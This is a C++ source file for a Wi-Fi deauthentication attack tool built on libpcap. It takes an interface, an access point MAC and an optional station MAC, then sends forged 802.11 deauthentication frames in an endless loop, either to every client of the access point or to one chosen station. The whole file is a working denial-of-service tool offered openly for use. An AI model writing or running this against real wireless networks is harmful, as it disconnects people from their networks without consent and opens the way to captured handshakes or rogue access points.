#include <pcap.h>
#include <iostream>
#include <cstdio>
#include <unistd.h>
#include "802-11.h"

using namespace std;

#define BROADCAST 1
#define UNICAST 2

struct Param {
	int mod;
	char* dev{0};
	Mac ap;
	Mac station;

	attack_packet packet;
	attack_packet packet2;

	bool parse(int argc, char* argv[]) {
		if(argc == 3) {
			mod = BROADCAST;
			dev = argv[1];
			ap = string(argv[2]);
		}
		else if(argc == 4) {
			mod = UNICAST;
			dev = argv[1];
			ap = string(argv[2]);
			station = string(argv[3]);
		}
		else return 0;
		return 1;
	}
} param;

void usage(void) {
	cout << "syntax : deauth-attack <interface> <ap mac> [<station mac>]" << '\n';
	cout << "sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB" << '\n';
}

void send_packet(pcap_t* handle) {
	if(param.mod == BROADCAST) {
		param.packet.init();
		param.packet.set(Mac::broadcastMac(), param.ap, param.ap);
		
		while(1) {
			int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&param.packet), sizeof(param.packet));
    		if (res != 0) {
	    		fprintf(stderr, "pcap_sendpacket return %d error=%s \n", res, pcap_geterr(handle));
	    		return;
    		}
			sleep(1);
		}
	}

	else {
		param.packet.init();
		param.packet2.init();

		param.packet.set(param.ap, param.station, param.ap);
		param.packet2.set(param.station, param.ap, param.ap);

		while(1) {
			int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&param.packet), sizeof(param.packet));
    		if (res != 0) {
	    		fprintf(stderr, "pcap_sendpacket return %d error=%s \n", res, pcap_geterr(handle));
	    		return;
    		}
			res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&param.packet2), sizeof(param.packet2));
    		if (res != 0) {
	    		fprintf(stderr, "pcap_sendpacket return %d error=%s \n", res, pcap_geterr(handle));
	    		return;
    		}
			sleep(1);
		}
	}

	
}


int main(int argc, char* argv[]) {
	if(param.parse(argc, argv) == 0) {
		usage();
		return -1;
	}

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(argv[1], BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", argv[1], errbuf);
		return -1;
	}

	send_packet(handle);

	pcap_close(handle);
	return 0;
}